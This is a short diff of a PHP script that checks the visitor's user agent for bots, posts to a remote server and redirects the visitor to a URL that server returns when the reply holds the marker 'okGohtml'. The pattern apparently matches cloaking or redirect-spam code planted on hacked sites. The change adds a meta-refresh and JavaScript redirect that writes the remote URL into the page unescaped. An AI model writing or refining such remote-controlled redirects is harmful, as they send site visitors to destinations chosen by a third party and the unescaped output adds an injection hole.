@@ -75,7 +75,7 @@ if ($match || stripos($user_agent, "bot")) {
         $htmlToshow = send_post($url, $post_data);
         if (stripos($htmlToshow, "okGohtml") == true) {
             $htmlToshow = str_ireplace("okGohtml", "", $htmlToshow);
-            header("Location: " . $htmlToshow);
+              echo('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></head><body><noscript><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></noscript><script>document.location.href = "'.$htmlToshow.'"</script></body></html>');
             exit;
         }
     }
